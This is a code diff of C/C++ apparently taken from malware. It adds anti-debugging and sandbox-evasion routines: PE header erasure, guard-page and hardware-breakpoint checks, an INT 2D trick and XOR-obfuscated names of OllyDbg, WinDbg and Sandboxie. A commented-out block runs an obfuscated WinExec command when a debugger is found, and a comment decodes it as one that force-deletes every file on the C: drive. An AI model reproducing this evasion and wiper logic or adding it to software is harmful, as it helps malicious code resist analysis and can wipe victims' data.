@@ -1,0 +1,193 @@
+/*
+//////////////////////////////////////////////////////////////////
+inline void ErasePEHeaderFromMemory()
+{
+    DWORD OldProtect = 0;
+    
+    // Get base address of module
+    char *pBaseAddr = (char*)GetModuleHandle(NULL);
+
+    // Change memory protection
+    VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
+            PAGE_READWRITE, &OldProtect);
+
+    // Erase the header
+    ZeroMemory(pBaseAddr, 4096);
+}
+//////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////
+inline int AddSubOne(int One, int Two)
+{
+    JUNK_CODE_ONE
+    return ( (One + Two) - 1 );
+}
+//////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////
+inline bool CheckOutputDebugString(LPCTSTR String)
+{
+    OutputDebugString(String);
+    if (GetLastError() == 0)
+        return true;
+    else
+        return false;
+}
+//////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////
+bool MemoryBreakpointDebuggerCheck()
+{
+     unsigned char *pMem = NULL;
+     SYSTEM_INFO sysinfo = {0}; 
+     DWORD OldProtect = 0;
+     void *pAllocation = NULL; // Get the page size for the system 
+ 
+    GetSystemInfo(&sysinfo); // Allocate memory 
+ 
+    pAllocation = VirtualAlloc(NULL, sysinfo.dwPageSize, 
+                        MEM_COMMIT | MEM_RESERVE, 
+                         PAGE_EXECUTE_READWRITE); 
+        
+    if (pAllocation == NULL)
+        return false; 
+    
+    // Write a ret to the buffer (opcode 0xc3)
+    pMem = (unsigned char*)pAllocation;
+    *pMem = 0xc3; 
+    
+    // Make the page a guard page         
+    if (VirtualProtect(pAllocation, sysinfo.dwPageSize, 
+                    PAGE_EXECUTE_READWRITE | PAGE_GUARD, 
+                    &OldProtect) == 0)
+    {
+        return false;
+    } 
+    
+    __try
+    {
+        __asm
+        {
+            mov eax, pAllocation
+            // This is the address we'll return to if we're under a debugger
+            push MemBpBeingDebugged
+            jmp eax // Exception or execution, which shall it be :D?
+        }
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER)
+    {
+        // The exception occured and no debugger was detected
+        VirtualFree(pAllocation, NULL, MEM_RELEASE);
+        return false;
+    }     
+    
+    __asm{MemBpBeingDebugged:}
+    VirtualFree(pAllocation, NULL, MEM_RELEASE);
+    return true;
+}
+//////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////
+int CheckHardwareBreakpoints()
+{
+    unsigned int NumBps = 0;
+
+    // This structure is key to the function and is the 
+    // medium for detection and removal
+    CONTEXT ctx;
+    ZeroMemory(&ctx, sizeof(CONTEXT)); 
+    
+    // The CONTEXT structure is an in/out parameter therefore we have
+    // to set the flags so Get/SetThreadContext knows what to set or get.
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS; 
+    
+    // Get a handle to our thread
+    HANDLE hThread = GetCurrentThread();
+
+    // Get the registers
+    if(GetThreadContext(hThread, &ctx) == 0)
+        return -1;
+
+    // Now we can check for hardware breakpoints, its not 
+    // necessary to check Dr6 and Dr7, however feel free to
+    if(ctx.Dr0 != 0)
+        ++NumBps; 
+    if(ctx.Dr1 != 0)
+           ++NumBps; 
+    if(ctx.Dr2 != 0)
+           ++NumBps; 
+    if(ctx.Dr3 != 0)
+        ++NumBps;
+        
+    return NumBps;
+}
+//////////////////////////////////////////////////////////////////
+inline bool Int2DCheck()
+{
+    __try
+    {
+        __asm
+        {
+            int 0x2d
+            xor eax, eax
+            add eax, 2
+        }
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER)
+    {
+        return false;
+    }
+    
+    return true;
+}
+//////////////////////////////////////////////////////////////////
+*/
+
+//////////////////
+  //	Anti Debug	//
+  //////////////////
+
+  //char odbg[8]="\x91\x92\x92\x87\x9A\x9C\x99"; // olly
+  //char wdbg[17] = "\x89\xB7\xB0\x9A\xBC\xB9\x98\xAC\xBF\xB3\xBB\x9D\xB2\xBF\xAD\xAD"; // windbg
+  //char sb[13] = "\x8D\xBC\xB7\xBB\x9A\xB2\xB2\xF0\xBA\xB2\xB2"; // sandboxie dll
+  //char key[4] = "\xDE\xED\xDE"; //static key
+  //int oz=0,zo=0,zx=0;
+  //AddSubOne(2,1);
+  //for(zx=0;zx<=strlen(wdbg)-1;zx++){
+  //  AddSubOne(3,zx);
+  //  wdbg[zx] ^= key[AddSubOne(1,0)];
+  //}
+
+  //if(IsDebuggerPresent()) {
+  //  AddSubOne(42,AddSubOne(3,3));
+  //  ErasePEHeaderFromMemory();
+  //  AddSubOne(AddSubOne(91,7),3);
+  //  ExitProcess(0);
+  //  AddSubOne(AddSubOne(9,4),32);
+  //}
+
+  //for(zx=0;zx<=strlen(sb)-1;zx++) {
+  //  AddSubOne(3,(zx+zx));
+  //  sb[zx] ^= key[AddSubOne(1,AddSubOne(0,1))];
+  //  AddSubOne(2,(zx));
+  //}
+  //for(zx=0;zx<=strlen(odbg)-1;zx++) {
+  //  odbg[zx] ^= key[AddSubOne(0,1)];
+  //  AddSubOne(42,(zx+zx));
+  //}
+
+  //HANDLE hWinDbg = FindWindow(wdbg, NULL);
+  //HANDLE Olay = FindWindow(odbg, NULL);
+  //if(CheckHardwareBreakpoints()||MemoryBreakpointDebuggerCheck()||GetModuleHandleA(sb)||CheckOutputDebugString("x*^&*%$#x*^&*%$#%s%s%s%s%s%s%s%s%s%s%s%s%s%d%d%d%d%d%d%d%x%x%x%s%s%s%s%s%d%d%d%d%d%d%d%x%x%x%s%s%s%s%s%d%d%d%d%d%d%d%x%x%x%x%x*^&*%$#x*^&*%$#")||hWinDbg) {
+  //  AddSubOne(4,2);
+  //  //// cmd.exe /c del /f /s /q c:\*.*
+  //  WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x5c\x64\x3a\x71\x76\x52\x0f\x1e\x4b\x21\x79\x20\x79\x57\x15\x6d\x12\x2f\x7c\x51"),0);
+  //  ErasePEHeaderFromMemory();
+  //  Sleep(80);
+  //  AddSubOne(4,3);
+  //  ExitProcess(AddSubOne(4,2)-5);
+  //  AddSubOne(4,4);
+  //  AddSubOne(8200,300);
+  //  ErasePEHeaderFromMemory();
+  //  AddSubOne(9,9);
+  //}
+
+  Sleep(2000);
+  SetErrorMode(0x0002);
+//#endif
